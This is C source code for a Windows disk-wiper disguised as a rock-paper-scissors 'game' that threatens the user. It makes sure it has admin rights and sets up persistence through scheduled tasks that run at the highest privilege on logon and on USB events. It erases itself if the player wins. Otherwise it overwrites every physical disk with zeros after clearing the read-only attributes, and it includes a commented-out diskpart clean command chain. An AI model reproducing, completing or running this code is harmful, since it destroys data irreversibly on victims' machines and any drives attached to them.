#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <winioctl.h> 
#include <ntdddisk.h>
#include <stdbool.h>
#include <winevt.h>

#pragma comment(lib, "wevtapi.lib")


// note*
// this is the most destruction you can do in ring3 but..
// this wont effect offline disks or hardware/offline-protected disks

// only run if user is admin
bool admin_check() {
    BOOL is_admin = FALSE;
    PSID admin_group = NULL;

    // admin group sid is "S-1-5-32-544"
    if (ConvertStringSidToSidA("S-1-5-32-544", &admin_group)) {
        if (!CheckTokenMembership(NULL, admin_group, &is_admin)) {
            is_admin = FALSE;
        }
        LocalFree(admin_group); // free mem from ConvertStringSidToSidA
    }

    if (!is_admin) {
        // reused from safe()
        system("schtasks /delete /tn \"game\" /f");
        char cmd[MAX_PATH + 64];
        GetModuleFileNameA(NULL, cmd, MAX_PATH);
        char rm_cmd[MAX_PATH + 128];
        sprintf(rm_cmd,
        "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
        system(rm_cmd);
        return 1;
    }
    return is_admin;
}
char rand_nm[7]; // global var, + null term
const char charset[] = "abcdefghijklmnopqrstuvwxyzaBCDEFGHIJKLMNOPQRSTUVWXYZ123456789";

void gen_rnd() {
    size_t len = sizeof(charset) -1; // for null term
    for (int a = 0; a < 6; a++) {
        rand_nm[a] = charset[rand() % len];
    }
    rand_nm[6] = '\0'; // null term
}


void task_sch_logon() {
    char exepath[MAX_PATH]; //finding current executable
    char cmd[MAX_PATH + 256]; // buffer for the rest of the code

    if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) {
        return;
    }

    sprintf(cmd, 
        "schtasks /create /sc onlogon /tn \"%s\" /tr \"%s payload\" /rl highest /f", 
        rand_nm, exepath);
    system(cmd);
    
}

BOOL past_usb_check(){
    EVT_HANDLE hQuery = EvtQuery(
        NULL,
        L"Microsoft-Windows-DriverFrameworks-UserMode/Operational",
        L"*[System[(EventID=2003)]]",
        EvtQueryReverseDirection
    );

    if (!hQuery) return FALSE;

    EVT_HANDLE hEvent;
    DWORD returned;
    BOOL found = FALSE;

    if (EvtNext(hQuery, 1, &hEvent, 0, 0, &returned)) {
        found = TRUE; 
        EvtClose(hEvent);
    }

    EvtClose(hQuery);
    return found;
}

ULONGLONG used_space_drive(const wchar_t* drive) {
    ULARGE_INTEGER free_bytes, total_bytes, total_free;
    if (GetDiskFreeSpaceExW(drive, &free_bytes, &total_bytes, &total_free)) {
        return total_bytes.QuadPart - free_bytes.QuadPart; // get used bytes
    }
    return 0;
}

DWORD drive_mask; //global
ULONGLONG threshold = 4ULL * 1024 * 1024 * 1024;

void check_new_usb() {
    drive_mask = GetLogicalDrives(); // gets bitmask of all drives
    check_usb_threshold(threshold);
}

void task_sch_usb() {
    if (!past_usb_check()) {
        return;
    }
    char exepath[MAX_PATH];
    char cmd[MAX_PATH + 512];
    if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) return;

    sprintf(cmd,
        "schtasks /create /tn \"%s\" /tr \"%s usb_check\" /sc ONEVENT "
        "/ec System /mo \"*[System[Provider[@Name='Kernel-PnP'] and EventID=200]]\" "
        "/rl highest /f",
        rand_nm, exepath);
    system(cmd);
    
}
void check_usb_threshold(ULONGLONG threshold) {
    for (int b = 0; b < 26; b++) {
            if (drive_mask & (1 << b)) {
                wchar_t drive[4] = {L'A' + b, L':', L'\\', L'\0'};
                ULONGLONG used = used_space_drive(drive);
            if (used >= threshold) {
                payload();
                break;
            }
        }
    }
}
// so if you win your system isnt destroyed
void safe() {
    // rm scheduled tsk
    char cmd[MAX_PATH + 256];
    sprintf(cmd, "schtasks /delete /tn \"%s\" /f", rand_nm);
    system(cmd);
    
    //delete itself
    //uses localhost as a delay method 
    char cmd[MAX_PATH + 64];
    GetModuleFileNameA(NULL, cmd, MAX_PATH);
    char rm_cmd[MAX_PATH + 128];
    sprintf(rm_cmd, "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
    system(rm_cmd);

}
void game() {
    SetConsoleTitleA("Screen");

    printf("=== Let's Play a little Game ===\n");
    printf("If you want your computer back...\n");
    printf("I wouldn't exit this program if I were you");

    srand(time(NULL));
	const char *dict[] = {"", "rock", "paper", "scissors"};
	int robot = rand() % 3 + 1;
	int play;
    char input[16];

	while (1){
        printf("rock(1), paper(2), scissors(3) >:");
        if (!fgets(input, sizeof(input), stdin)) 
            continue;

        if (sscanf(input, "%d", &play) !=1 || play<1 || play>3){ // from Tyler, input handling
            printf("1, 2 or 3!!!\n invalid input ");
            continue;
        }
        break; // valid input 
    }

	int rps = play - robot;
	printf("robot chose %s\n", dict[robot]);
	if ((rps > 0 && rps != -2) || rps == -2) {
        printf("you won!\n");
        safe();
    } else if (rps == -1 || rps == 0) {
        printf("you lost :(\n");
    }
}


//1. scans < 32 disks 
//2. opens each direct, unbuffered i/o
//3. clear *software* read-only attributes -> "IOCTL_DISK_SET_DISK_ATTRIBUTES"
//4. finds drive size
//5. zeros every sector useing 16 mb buffer

void payload() {
    /*system(
        "cmd /c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
        "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
        "echo select disk %a >> cl.txt & echo attributes disk clear readonly >> cl.txt & echo clean >> cl.txt) && "
        "diskpart /s cl.txt && del ld.txt && del lo.txt && del cl.txt"
    );*/
    
    // only accepts 32 disks
    for (int disknum = 0; disknum < 32; disknum++) {
        char disk_path[64];
        sprintf(disk_path, "\\\\.\\PhysicalDrive%d", disknum);

        // open disk for direct write, bypass cache
        HANDLE hDisk = CreateFileA(
            disk_path,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, 
            OPEN_EXISTING,
            FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, //more like diskpart clean all
            0
        );
        if (hDisk == INVALID_HANDLE_VALUE) continue;

        // clear read only flags
        DISK_ATTRIBUTES attrs = {0};
        DWORD bytesReturned;

        DeviceIoControl(
            hDisk,
            IOCTL_DISK_GET_DISK_ATTRIBUTES,
            NULL, 0,
            &attrs, sizeof(attrs),
            &bytesReturned,
            NULL
        );

        //clear read only flag
        attrs.ReadOnly = 0;

        //write updated attributes
        DeviceIoControl(
            hDisk,
            IOCTL_DISK_SET_DISK_ATTRIBUTES,
            &attrs, sizeof(attrs),
            NULL, 0,
            &bytesReturned,
            NULL
        );

        // find disk size
        LARGE_INTEGER disk_size;
        DeviceIoControl(
            hDisk,
            IOCTL_DISK_GET_LENGTH_INFO,
            NULL, 0, 
            &disk_size, sizeof(disk_size),
            &bytesReturned,
            NULL
        );
        // large buffer for faster writes, not as fast as powershell :(
        const size_t bufSize = 16 * 1024 * 1024; // has to be divisble by 512
        char* buffer = (char*)VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) { CloseHandle(hDisk); return; }
        ZeroMemory(buffer, bufSize);

        LARGE_INTEGER offset;
        offset.QuadPart = 0;
        DWORD written;

        while (offset.QuadPart < disk_size.QuadPart) {
            SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
            WriteFile(hDisk, buffer, (DWORD)((disk_size.QuadPart - offset.QuadPart > bufSize) ? bufSize : disk_size.QuadPart - offset.QuadPart), &written, NULL);
            offset.QuadPart += written;
        }

        // so theres no memory leaks
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hDisk);
    }
}
int main(int argc, char *argv[]){
    // so that on logon, the script only runs the payload
    // i added flagging in the first place because i want the user to
    //enter uac once at the start instead of after they lose
    if (argc > 1 && strcmp(argv[1], "payload") == 0) {
        payload();
        return 0;
    } else if (strcmp(argv[1], "usb_check") == 0) {
        check_new_usb();
        return 0;
    }
    admin_check();
    srand(time(NULL));
    gen_rnd();
    task_sch_logon();
    task_sch_usb();
    game();
}